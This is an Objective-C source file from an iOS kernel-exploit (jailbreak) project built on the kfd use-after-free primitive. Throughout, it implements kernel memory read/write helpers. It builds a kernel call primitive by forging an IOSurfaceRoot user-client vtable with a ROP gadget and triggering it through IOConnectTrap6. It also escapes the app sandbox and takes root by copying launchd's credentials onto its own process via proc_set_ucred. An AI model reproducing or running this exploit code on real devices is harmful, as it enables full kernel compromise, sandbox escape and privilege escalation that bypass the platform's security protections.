//
//  krw.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"
#import "offsets.h"
#import "sandbox.h"
#import "ipc.h"
#import "KernelRwWrapper.h"
#import "jailbreakd.h"
#include <stdio.h>
#include <UIKit/UIKit.h>
#import "proc.h"
#import "escalate.h"

#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)


uint64_t _kfd = 0;
uint64_t FINAL_KFD;
uint64_t _self_task = 0;
uint64_t _self_proc = 0;
uint64_t _kslide = 0;
uint64_t _kern_proc = 0;
uint64_t _kern_pmap = 0;
uint64_t groot_ogucredof_proc = 0;

uint64_t add_x0_x0_0x40_ret_func;
//uint64_t groot_ogucredof_proc;
uint64_t proc_set_ucred_func = 0;


uint64_t get_selftask(void) { return _self_task; }
uint64_t get_selfproc(void) { return _self_proc; }
uint64_t get_kslide(void) { return _kslide; }
uint64_t get_kernproc(void) { return _kern_proc; }
uint64_t get_kernpmap(void) { return _kern_pmap; }
void set_selftask(void) { _self_task = ((struct kfd*)_kfd)->info.kernel.current_task; }
void set_selfproc(void) { _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc; }
void set_kslide(void) { _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide; }
void set_kernproc(void) { _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc; }
void set_kernpmap(void) { _kern_pmap = ((struct kfd*)_kfd)->info.kernel.kernel_pmap; }

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    
    set_selftask();
    set_selfproc();
    set_kslide();
    set_kernproc();
    set_kernpmap();

    return _kfd;
}

void do_kclose(void)
{
    kclose(_kfd);
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

void kwritebuf(uint64_t kaddr, void* input, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t inputOffset = 0;
    unsigned char* inputBytes = (unsigned char*)input;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t toWrite = 0;
        int bc = 4;
        
        uint64_t remainingBytes = endAddr - curAddr;
        if(remainingBytes < 4)
        {
            toWrite = kread32(curAddr);
            bc = (int)remainingBytes;
        }
        
        unsigned char* wb = (unsigned char*)&toWrite;
        for(int i = 0; i < bc; i++)
        {
            wb[i] = inputBytes[inputOffset];
            inputOffset++;
        }

        kwrite32(curAddr, toWrite);
    }
}


uint64_t FINAL_KFD;
uint64_t _fake_vtable = 0;
uint64_t _fake_client = 0;
mach_port_t _user_client = 0;
uint64_t fake_vtable;
uint64_t fake_client;
mach_port_t user_client;

uint64_t init_kcallKRW(void) {
     struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
    uint64_t add_x0_x0_0x40_ret_func = 0;
    init_kernel(kfd_struct);
    printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
    add_x0_x0_0x40_ret_func = getOffset(0);
    printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);

    if (add_x0_x0_0x40_ret_func == 0) {
        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);//18446744005236302004
        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);

        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005083553972
        printf("off_add_x0_x0_0x40_ret --ksl  0x%llx\n", off_add_x0_x0_0x40_ret);

        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
        printf("add_x0_x0_0x40_ret_func  = 0x%llx\n", add_x0_x0_0x40_ret_func);

    } else {
        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
        printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);

        add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
        printf("add_x0_x0_0x40_ret_func += 0x%llx\n", add_x0_x0_0x40_ret_func);

        off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005086625264
        printf("off_add_x0_x0_0x40_ret --ksl = 0x%llx\n", off_add_x0_x0_0x40_ret);

    }
    
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
        printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    _user_client = 0;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
    if (err != KERN_SUCCESS){
        printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    IOObjectRelease(service);
    uint64_t uc_port = port_name_to_ipc_port(_user_client);
    uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
    uint64_t uc_vtab = kread64(uc_addr);
    
    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    
    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(_fake_client, _fake_vtable);
    kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
    kwrite64(_fake_vtable+8*0xB8, off_add_x0_x0_0x40_ret + get_kslide());//18446744005086625264
    //kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
//    printf("add_x0_x0_0x40_ret_func = 0x%llx", add_x0_x0_0x40_ret_func);
  //  printf("off_add_x0_x0_0x40_ret = 0x%llx", off_add_x0_x0_0x40_ret);
   // printf("off_add_x0_x0_0x40_ret wS = 0x%llx", off_add_x0_x0_0x40_ret + get_kslide());


    return 0;
}

uint64_t zm_fix_addr_kalloc(u64 kfd, uint64_t addr) {
    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;    //XXX guess what is that address xD
    uint64_t kmem = off_zm_fix_addr_kalloc + get_kslide();
    uint64_t zm_alloc = kread64(kmem);
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;
    return (zm_stripped | ((addr) & 0xffffffff));
}
#define MAKE_KPTR(v) (v | 0xffffff8000000000)

uint64_t kcallKRW(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
   /* if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
        uint64_t offx20 = kread64(fake_client+0x40);uint64_t offx28 = kread64(fake_client+0x48);
        kwrite64(fake_client+0x40, x0);kwrite64(fake_client+0x48, addr);
        uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
        kwrite64(fake_client+0x40, offx20);kwrite64(fake_client+0x48, offx28);
        return returnval;
    } else {*/
        uint64_t offx20 = MAKE_KPTR(kread64(_fake_client+0x40));
    
        uint64_t offx28 = MAKE_KPTR(kread64(_fake_client+0x48));
    
        kwrite64(_fake_client+0x40, x0);kwrite64(_fake_client+0x48, addr);
        uint64_t returnval = IOConnectTrap6(_user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
        kwrite64(_fake_client+0x40, offx20);kwrite64(_fake_client+0x48, offx28);
        return returnval;
    //}
}

uint64_t kalloc(u64 kfd, size_t ksize) {
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t allocated_kmem;
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
       // kfree(kfd, fake_client, fake_client);
        allocated_kmem = dirty_kalloc(kfd, ksize);
        //kcall2(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
    } else {
        allocated_kmem = kcallKRW(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
     }
    return zm_fix_addr_kalloc(kfd, allocated_kmem);
}

uint64_t kalloc2ndx(u64 kfd, size_t ksize) {
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t allocated_kmem;
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
       // kfree(kfd, fake_client, fake_client);
        
        allocated_kmem = dirty_kalloc(kfd, ksize);
        //kcall2(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
    } else {allocated_kmem = kcallKRW(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0); }
    return zm_fix_addr_kalloc(kfd, allocated_kmem);
}

int kalloc_using_empty_kdata_page(void) {
    //init_kcall2(FINAL_KFD);
    init_kcallKRW();
    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(FINAL_KFD, 0x1000);
    allocated_kmem[1] = kalloc(FINAL_KFD, 0x1000);
    IOServiceClose(_user_client);
    _user_client = 0;
    usleep(1000);
    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x1000);
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];

    return 0;
}

int kalloc_using_empty_kdata_page152(void) {
    //init_kcall2(FINAL_KFD);

    /*uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = dirty_kalloc(FINAL_KFD, 0x1000);//    kalloc(FINAL_KFD, 0x1000);
    allocated_kmem[1] = dirty_kalloc(FINAL_KFD, 0x1000);// kalloc(FINAL_KFD, 0x1000);
    IOServiceClose(user_client);
    user_client = 0;
    usleep(500);
    clean_dirty_kalloc(fake_vtable, 0x1000);
    clean_dirty_kalloc(fake_client, 0x1000);
    fake_vtable = allocated_kmem[0];
    fake_client = allocated_kmem[1];*/
    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(FINAL_KFD, 0x1000);
    allocated_kmem[1] = kalloc(FINAL_KFD, 0x1000);
    IOServiceClose(_user_client);
    _user_client = 0;
    usleep(1000);
    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x1000);
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];

    return 0;
}

int prepare_kcall152(uint64_t fclient, uint64_t fvtable, mach_port_t uclient) {
 
    
    return 0;
    
}


int prepare_kcall(void) {
    NSString* save_path = @"/tmp/kfd-arm64.plist";
    if(access(save_path.UTF8String, F_OK) == 0) {
        uint64_t sb = unsandbox(getpid());
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
            
            NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
            _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
            _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
            sandbox(getpid(), sb);
        } else {
            NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
            _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
            _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
            sandbox(getpid(), sb);

        }
        
    } else {
        if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
            //kalloc_using_empty_kdata_page();
            printf("ID:%d\n", getuid());
            kalloc_using_empty_kdata_page152();
            
            uint64_t sb = unsandbox(getpid());
           // printf("Sandbox OG : 0x%llx\n", sb);
            NSDictionary *dictionary = @{
                @"kcall_fake_vtable_allocations": @(_fake_vtable),
                @"kcall_fake_client_allocations": @(_fake_client),
            };
            BOOL success = [dictionary writeToFile:save_path atomically:YES];
            if (!success) { printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n"); return -1; }
           // sandbox(getpid(), sb);
            bool didweboxit = sandbox(getpid(), sb);
           // printf("Sandboxed? = %i\n", didweboxit);
            //usleep(1000);
            //uint64_t procAmfipid = proc_of_pidAMFI(getpid());
            
           // printf("Saved fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
           // init_kcall2(FINAL_KFD);
            //init_kcall2(FINAL_KFD);
            //init_kcallKRW();

        } else {
            kalloc_using_empty_kdata_page();
            uint64_t sb = unsandbox(getpid());
            //printf("[}] Sandbox OG : 0x%llx\n", sb);

            NSDictionary *dictionary = @{
                @"kcall_fake_vtable_allocations": @(_fake_vtable),
                @"kcall_fake_client_allocations": @(_fake_client),
            };
            BOOL success = [dictionary writeToFile:save_path atomically:YES];
            if (!success) { printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n"); return -1; }
            bool didweboxit = sandbox(getpid(), sb);
            //printf("Sandboxed? = %d\n", didweboxit);
            //printf("Saved fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
            init_kcallKRW();
        }
    }
    return 0;
}

int term_kcall(void) {
    IOServiceClose(_user_client);
    _user_client = 0;
    return 0;
}
#define TF_PLATFORM (0x00000400)
#define CS_PLATFORM_BINARY (0x04000000)
#define CS_INSTALLER (0x00000008)
#define CS_GET_TASK_ALLOW (0x00000004)
#define CS_RESTRICT (0x00000800)
#define CS_HARD (0x00000100)
#define CS_KILL (0x00000200)
#define CS_DEBUGGED                    0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
#define CS_REQUIRE_LV      0x00002000  /* require library validation */

uint64_t gogroo(uint64_t proc_addr)
{
    uint64_t self_ro = kread64(proc_addr + 0x20);
    uint64_t old_OG_proc_ucred = kread64(self_ro + 0x20);
    uint64_t kernproc = proc_of_pid(0);
    uint64_t kern_ro = kread64(kernproc + 0x20);
    uint64_t LDproc = proc_of_pid(1);
    uint64_t LDproc_ro = kread64(LDproc + 0x20);
    uint64_t LDproc_ucred = kread64(LDproc_ro + 0x20);
    kcallKRW(proc_set_ucred_func, proc_addr, LDproc_ucred, 0, 0, 0, 0, 0);
    
    setuid(0);
    setuid(0);
    return old_OG_proc_ucred;
}

void stage22(u64 kfd)
{
    struct kfd* kfd_struct = (struct kfd*)kfd;
    init_kernel(kfd_struct);
   /* if (add_x0_x0_0x40_ret_func == 0) {
        add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct); //18446744005378351284
        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
    } else {
        add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
    }*/
    
    if (proc_set_ucred_func == 0) {
        proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);//18446744005408493912
        setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
    } else {
        proc_set_ucred_func += kfd_struct->info.kernel.kernel_slide;
    }
    pid_t pid = getpid();
    uint64_t proc_addr = proc_of_pid(getpid());//proc_of_pid2(kfd, getpid());
    init_kcallKRW();
    gogroo(proc_addr);///18446744017486185808

}


void dothestage2(void) {
    stage22(FINAL_KFD);
    //stage2(FINAL_KFD);
}

/*void unset_groot(uint64_t proc_unset)
{
    unset_groot_stage(FINAL_KFD, proc_unset);
    return;
}*/


uint64_t getting_proc_SetCRED(void) {
    return proc_set_ucred_func;
}
